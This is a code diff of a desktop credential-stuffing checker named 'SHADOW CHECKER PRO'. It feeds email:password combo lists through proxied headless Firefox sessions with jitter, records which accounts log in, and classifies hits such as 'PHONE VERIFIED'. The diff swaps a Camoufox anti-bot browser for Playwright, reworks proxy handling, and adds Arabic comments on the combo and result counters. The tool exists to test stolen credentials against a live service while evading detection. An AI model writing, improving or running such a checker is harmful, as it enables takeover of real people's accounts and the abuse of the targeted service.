@@ -1,5 +1,5 @@
 """
-SHADOW CHECKER PRO — Camoufox Anti-Bot Engine, Private Contexts, Staggered Jitter, Proxy Quarantine & Classified Auto-Save
+SHADOW CHECKER PRO — Firefox Private Contexts, Staggered Jitter, Proxy Quarantine & Classified Auto-Save
 """
 
 import sys
@@ -29,7 +29,7 @@ from PySide6.QtWidgets import (
 )
 
 from PySide6.QtGui import QPixmap, QPainter, QColor, QFont
-from camoufox.sync_api import Camoufox
+from playwright.sync_api import sync_playwright
 import openpyxl
 
 from integrations.proxy_runtime import ProxyRuntime
@@ -259,7 +259,7 @@ class FirefoxWorker(QThread):
                 email, password = combo
                 masked_email = email[:3] + "***" if len(email) > 3 else "***"
                 self.status_signal.emit(self.browser_id, f"CHECKING {masked_email}", proxy_label)
-                self.log_signal.emit(f"[{label}] Opening fresh isolated Camoufox Context for: {masked_email}")
+                self.log_signal.emit(f"[{label}] Opening fresh isolated Firefox Private Context for: {masked_email}")
 
                 status = "UNKNOWN"
                 detail = "Initialized"
@@ -268,22 +268,20 @@ class FirefoxWorker(QThread):
                 session_bridge.start()
                 self.current_bridge = session_bridge
 
-                camoufox_options = {
-                    "headless": True,
-                    "os": "windows",
-                    "humanize": True,
-                }
-                if not self.direct:
-                    if self.proxy is None or not self.protocol or self.lease is None:
-                        raise RuntimeError("Proxy requires verified lease")
-                    camoufox_options["proxy"] = self.proxy.playwright_config(self.protocol)
+                with sync_playwright() as playwright:
+                    options = {"headless": True}
+                    if not self.direct:
+                        if self.proxy is None or not self.protocol or self.lease is None:
+                            raise RuntimeError("Proxy requires verified lease")
+                        options["proxy"] = self.proxy.playwright_config(self.protocol)
 
-                with Camoufox(**camoufox_options) as browser:
+                    browser = playwright.firefox.launch(**options)
                     context = None
                     try:
                         context_opts = {
                             "viewport": FIREFOX_VIEWPORT,
                             "accept_downloads": False,
+                            "permissions": [],
                             "ignore_https_errors": False,
                         }
 
@@ -400,6 +398,11 @@ class FirefoxWorker(QThread):
                                 context.close()
                             except Exception:
                                 pass
+                        if browser is not None:
+                            try:
+                                browser.close()
+                            except Exception:
+                                pass
 
                     self.result_signal.emit(email, password, status, detail)
                     self.log_signal.emit(f"[{label}] Result for {masked_email} -> {status} [{detail}]")
@@ -425,7 +428,7 @@ class CheckerWindow(QMainWindow):
         super().__init__()
 
         self.setWindowTitle(
-            "SHADOW CHECKER PRO — Camoufox Anti-Bot & Proxy Quarantine"
+            "SHADOW CHECKER PRO — Firefox Private & Proxy Quarantine"
         )
 
         self.resize(920, 610)
@@ -445,7 +448,7 @@ class CheckerWindow(QMainWindow):
 
         self.proxy_pool = ProxyPool()
         self.combo_queue = queue.Queue()
-        self.total_loaded_combos = 0
+        self.total_loaded_combos = 0  # لتخزين العدد الإجمالي الأصلي
 
         self.browser_status = []
         self.browser_show_buttons = []
@@ -467,7 +470,7 @@ class CheckerWindow(QMainWindow):
         self.build_ui()
         self.diagnostic("system", "startup", python=sys.version.split()[0],
                         os=platform.platform(), target=TARGET_URL)
-        self.log("Proxy Runtime & Camoufox Anti-Bot Context Manager ready at startup.")
+        self.log("Proxy Runtime & Firefox Private Context Manager ready at startup.")
 
     def panel(self, layout=None):
         panel = QFrame(objectName="panel")
@@ -728,6 +731,7 @@ class CheckerWindow(QMainWindow):
                 header.addWidget(QLabel("Results", objectName="section"))
                 header.addSpacing(8)
 
+                # كادر Combo مستقل يعرض العدد الحالي / العدد الإجمالي (مثال: Combo : 13 / 207)
                 self.combo_badge = QLabel("Combo : 0 / 0")
                 self.combo_badge.setStyleSheet("""
                     background: #3B4349;
@@ -740,6 +744,7 @@ class CheckerWindow(QMainWindow):
                 header.addWidget(self.combo_badge)
                 header.addSpacing(6)
 
+                # كادر كبير أخضر للنتائج (Phone, Ok, New)
                 self.green_results_badge = QLabel()
                 self.green_results_badge.setStyleSheet("""
                     background: #315845;
@@ -816,6 +821,7 @@ class CheckerWindow(QMainWindow):
 
         v.addLayout(panes, 1)
 
+    # --- دوال تحديث الكوادر الحية ---
     def update_green_badge_display(self, phone_count, ok_count, new_count):
         text = (
             f'<span style="color: #D7F7DF; font-weight: bold;">Phone : {phone_count}</span>'
@@ -828,8 +834,11 @@ class CheckerWindow(QMainWindow):
             self.green_results_badge.setText(text)
 
     def refresh_results_badge(self):
+        # العدد الإجمالي الكلي للكومبوهات
         total_initial = self.total_loaded_combos
+        # العدد اللي باقي في الطابور (Queue)
         remaining_in_queue = self.combo_queue.qsize()
+        # العدد الحالي اللي تم فحصه وتجاوزناه (الإجمالي ناقص الباقي في الطابور)
         current_checked = max(0, total_initial - remaining_in_queue)
         
         phone_count = sum(1 for r in self.results if r[2] == "PHONE VERIFIED")
@@ -945,7 +954,7 @@ class CheckerWindow(QMainWindow):
                     self.combo_queue.put((email, password))
                     valid_count += 1
         
-        self.total_loaded_combos = valid_count
+        self.total_loaded_combos = valid_count  # حفظ العدد الإجمالي الحقيقي
         self.log(f"Loaded {valid_count} combos from source file.")
         self.loaded_label.setText(f"Loaded: {valid_count}")
         self.refresh_results_badge()
